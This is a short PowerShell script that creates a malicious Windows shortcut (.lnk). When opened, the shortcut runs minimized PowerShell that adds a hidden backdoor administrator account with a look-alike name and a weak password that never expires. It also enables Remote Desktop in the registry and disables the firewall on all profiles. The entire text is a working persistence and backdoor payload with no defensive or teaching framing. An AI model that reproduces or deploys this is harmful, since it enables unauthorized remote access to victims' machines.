$Shell = New-Object -ComObject ("WScript.shell")
$Shortcut = $Shell.CreateShortcut("C:\Users\CJ\Desktop\malnk.lnk")
$Shortcut.TargetPath="%windir%\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments="New-LocalUser -Name 'Admimistrator' -Password ('p@ssword' | ConvertTo-SecureString -AsPlainText -Force) -Description 'Created by your organization.' -AccountNeverExpires -PasswordNeverExpires; Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -Value 0; Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False; Read-Host -Prompt 'fug'"
$Shortcut.WindowStyle=7
$Shortcut.Save()